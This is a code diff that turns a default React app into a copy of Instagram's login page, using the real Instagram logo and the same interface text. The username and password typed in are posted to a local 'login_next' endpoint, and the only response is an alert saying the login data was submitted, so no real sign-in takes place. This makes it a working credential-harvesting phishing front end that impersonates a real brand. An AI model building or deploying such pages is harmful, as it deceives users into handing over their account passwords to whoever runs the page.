@@ -1,23 +1,65 @@
-import logo from './logo.svg';
 import './App.css';
+import { useState } from 'react';
+import axios from 'axios';
 
 function App() {
+  const [formData, setFormData] = useState({
+    username: '',
+    password: '',
+  });
+
+  const handleChange = (e) => {
+    setFormData({
+      ...formData,
+      [e.target.name]: e.target.value,
+    });
+  };
+
+  const handleSubmit = async () => {
+    try {
+      const response = await axios.post('http://localhost:8000/api/login_next/', formData);
+      console.log('Success:', response.data);
+      alert('Login data submitted!');
+    } catch (error) {
+      console.error('Error:', error);
+      alert('Error submitting login data.');
+    }
+  };
+
   return (
-    <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.js</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
+    <div className="app">
+      <div className="login-container">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1024px-Instagram_logo.svg.png"
+          alt="Instagram Logo"
+          className="logo"
+        />
+        <input
+          type="text"
+          placeholder="Phone number, username, or email"
+          name="username"
+          value={formData.username}
+          onChange={handleChange}
+        />
+        <input
+          type="password"
+          placeholder="Password"
+          name="password"
+          value={formData.password}
+          onChange={handleChange}
+        />
+        <button onClick={handleSubmit}>Log In</button>
+        <div className="separator">
+          <div className="line"></div>
+          <span>OR</span>
+          <div className="line"></div>
+        </div>
+        <div className="facebook-login">Log in with Facebook</div>
+        <div className="forgot-password">Forgot password?</div>
+      </div>
+      <div className="signup-box">
+        Don't have an account? <span>Sign up</span>
+      </div>
     </div>
   );
 }
